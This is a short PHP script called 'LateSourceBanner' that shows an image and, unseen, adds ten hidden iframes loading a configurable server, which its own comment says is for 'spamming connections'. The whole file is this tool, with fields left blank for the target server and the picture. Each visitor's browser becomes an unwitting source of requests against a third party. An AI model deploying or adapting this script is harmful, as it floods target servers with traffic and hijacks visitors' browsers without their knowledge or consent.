<?php
/*
 * *********************************************
 * LateSourceBanner
 *
 * "because it's literally spamming connections"
 * **********************************************
 */
/*
 * **********************************************
 * Edit the following for customization
 * **********************************************
 */
$server = "";
$picture_to_display = "";
/*
 * **********************************************
 * Don't edit the following
 * unless you know what you're doing.
 * **********************************************
 */
$loop = 1;
function loop_frames($amount) {
	global $server, $style, $loop;
	$html = '<iframe ';
	$html .= 'src="http://' . $server . '" ';
	$html .= 'style="visibility:hidden;display:none"';
	$html .= '></iframe>';
	while ( $loop <= $amount ) {
		echo $html;
		$loop ++;
	}
}

echo '<img src="' . $picture_to_display . '">';
loop_frames ( 10 );
?>